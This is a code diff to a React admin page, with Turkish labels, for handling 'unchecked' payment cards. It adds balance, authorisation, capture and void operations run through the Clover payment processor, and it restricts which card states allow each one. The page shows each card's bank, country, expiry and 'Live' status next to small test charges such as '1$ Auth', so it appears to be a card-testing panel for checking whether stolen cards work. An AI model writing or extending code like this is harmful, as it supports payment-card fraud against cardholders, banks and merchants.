@@ -40,15 +40,10 @@ const styles = `
     max-width: 280px;
   }
 
-  .unchecked-owner .unchecked-meta,
-  .unchecked-result {
+  .unchecked-owner .unchecked-meta {
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
-  }
-
-  .unchecked-result {
-    max-width: 320px;
   }
 
   .unchecked-status {
@@ -93,8 +88,6 @@ const styles = `
   }
 `
 
-const providers = ['clover', 'paypal', 'nmi', 'fluidpay', 'braintree', 'globalpayments', 'propelrpay', 'quiklie', 'zoho']
-
 function serverPagination(meta, setPage, setPageSize) {
   return {
     page: meta.page,
@@ -132,6 +125,7 @@ function cardMeta(card = {}) {
 }
 
 function checkedLiveStatus(card = {}) {
+  if (card.voidStatus === 'voided' || card.void === true) return 'voided'
   if (card.captureStatus === 'captured' || card.capture === true) return 'captured'
   if (card.authStatus === 'authorized' || card.auth === true) return 'authorized'
   if (card.live === true) return 'live'
@@ -139,7 +133,7 @@ function checkedLiveStatus(card = {}) {
 }
 
 function checkedLiveAmount(card = {}) {
-  const value = card.authAmount ?? card.lastAmount
+  const value = card.balanceAmount ?? card.authAmount ?? card.lastAmount
   if (value === null || value === undefined || value === '') return '-'
   return `${value} ${card.authCurrency || card.lastCurrency || 'USD'}`
 }
@@ -176,18 +170,22 @@ function ProviderPrompt({ prompt, setPrompt, onSubmit }) {
         </div>
         <label>
           Provider
-          <select value={prompt.provider} onChange={(event) => setPrompt((current) => ({ ...current, provider: event.target.value }))}>
-            {providers.map((provider) => <option value={provider} key={provider}>{provider}</option>)}
+          <select value={prompt.provider} disabled onChange={(event) => setPrompt((current) => ({ ...current, provider: event.target.value }))}>
+            <option value="clover">clover</option>
           </select>
         </label>
-        <label>
-          {prompt.kind === 'balance' ? 'Balance value' : 'Amount'}
-          <input value={prompt.amount} onChange={(event) => setPrompt((current) => ({ ...current, amount: event.target.value }))} />
-        </label>
-        <label>
-          Transaction / Retref
-          <input value={prompt.transactionId || ''} onChange={(event) => setPrompt((current) => ({ ...current, transactionId: event.target.value }))} />
-        </label>
+        {prompt.kind !== 'void' && (
+          <label>
+            {prompt.kind === 'balance' ? 'Balance value' : 'Amount'}
+            <input value={prompt.amount} onChange={(event) => setPrompt((current) => ({ ...current, amount: event.target.value }))} />
+          </label>
+        )}
+        {['capture', 'void'].includes(prompt.kind) && (
+          <label>
+            Transaction / Retref
+            <input value={prompt.transactionId || ''} onChange={(event) => setPrompt((current) => ({ ...current, transactionId: event.target.value }))} />
+          </label>
+        )}
         <div className="row-actions">
           <button type="button" onClick={() => onSubmit(prompt)}>Çalıştır</button>
           <button className="ghost" type="button" onClick={() => setPrompt(null)}>Vazgeç</button>
@@ -404,7 +402,16 @@ function truncateText(text, maxLength = 30) {
 
 function checkedLiveCanRun(card, operation) {
   if (!card) return false
-  if (operation === 'capture') return Boolean(card.providerReferenceId)
+  const provider = String(card.provider || 'clover').toLowerCase()
+  if (provider && provider !== 'clover') return false
+  const hasReference = Boolean(card.providerReferenceId)
+  const isAuthorized = card.authStatus === 'authorized' || card.auth === true
+  const isCaptured = card.captureStatus === 'captured' || card.capture === true
+  const isVoided = card.voidStatus === 'voided' || card.void === true
+  if (operation === 'balance') return !isCaptured && !isVoided
+  if (operation === 'auth') return !isCaptured && !isVoided
+  if (operation === 'capture') return isAuthorized && hasReference && !isCaptured && !isVoided
+  if (operation === 'void') return isAuthorized && hasReference && !isCaptured && !isVoided
   return true
 }
 
@@ -502,8 +509,8 @@ export function UncheckedCardsPage({ user, runAction }) {
       kind,
       card,
       action: kind === 'unchecked-live' ? 'Live Check' : kind,
-      provider: card.provider || 'clover',
-      amount: ['unchecked-live', 'auth', 'capture'].includes(kind) ? '1.00' : '0.01',
+      provider: 'clover',
+      amount: ['unchecked-live', 'auth', 'capture'].includes(kind) ? '1.00' : '0.00',
       transactionId: card.providerReferenceId || '',
     })
   }
@@ -795,7 +802,6 @@ export function UncheckedCardsPage({ user, runAction }) {
                 <th>Banka / Ülke</th>
                 <th>Son Kullanma</th>
                 <th>Durum</th>
-                <th>Sonuç</th>
                 <th>Eklenme</th>
                 <th>İşlem</th>
               </tr>
@@ -842,9 +848,6 @@ export function UncheckedCardsPage({ user, runAction }) {
                       <div className="unchecked-status-row"><span>Live</span><StatusPill value={card.live} /></div>
                     </div>
                   </td>
-                  <td className="unchecked-result" title={card.operatorMessage || card.lastCheck?.operatorMessage || ''}>
-                    {truncateText(card.operatorMessage || card.lastCheck?.operatorMessage || '-', 44)}
-                  </td>
                   <td>{formatDate(card.createdAt)}</td>
                   <td>
                     {canRunAuthCheck
@@ -855,8 +858,8 @@ export function UncheckedCardsPage({ user, runAction }) {
                   </td>
                 </tr>
               ))}
-              {uncheckedError && <tr><td colSpan="9" className="muted">{uncheckedError}</td></tr>}
-              {!unchecked.rows.length && !uncheckedError && <tr><td colSpan="9" className="muted">Kayıt yok</td></tr>}
+              {uncheckedError && <tr><td colSpan="8" className="muted">{uncheckedError}</td></tr>}
+              {!unchecked.rows.length && !uncheckedError && <tr><td colSpan="8" className="muted">Kayıt yok</td></tr>}
             </tbody>
           </table>
         </div>
@@ -918,10 +921,11 @@ export function UncheckedCardsPage({ user, runAction }) {
                   <td>{formatDate(card.updatedAt || card.createdAt)}</td>
                   <td>
                     <div className="checked-live-actions">
-                      {canRunAuthCheck && checkedLiveCanRun(card, 'live') ? <button className="small ghost" type="button" onClick={() => openPrompt('live', card)}>Live</button> : null}
-                      {canRunAuthCheck && checkedLiveCanRun(card, 'auth') ? <button className="small ghost" type="button" onClick={() => openPrompt('auth', card)}>1$ Auth</button> : null}
+                      {canRunAuthCheck && checkedLiveCanRun(card, 'balance') ? <button className="small ghost" type="button" onClick={() => openPrompt('balance', card)}>Balance</button> : null}
+                      {canRunAuthCheck && checkedLiveCanRun(card, 'auth') ? <button className="small ghost" type="button" onClick={() => openPrompt('auth', card)}>Auth</button> : null}
                       {canRunAuthCheck && checkedLiveCanRun(card, 'capture') ? <button className="small ghost" type="button" onClick={() => openPrompt('capture', card)}>Capture</button> : null}
-                      {!checkedLiveCanRun(card, 'capture') ? <span className="muted">Capture için ref yok</span> : null}
+                      {canRunAuthCheck && checkedLiveCanRun(card, 'void') ? <button className="small ghost" type="button" onClick={() => openPrompt('void', card)}>Void</button> : null}
+                      {!checkedLiveCanRun(card, 'capture') && !checkedLiveCanRun(card, 'void') ? <span className="muted">Auth sonrası capture/void</span> : null}
                     </div>
                   </td>
                 </tr>
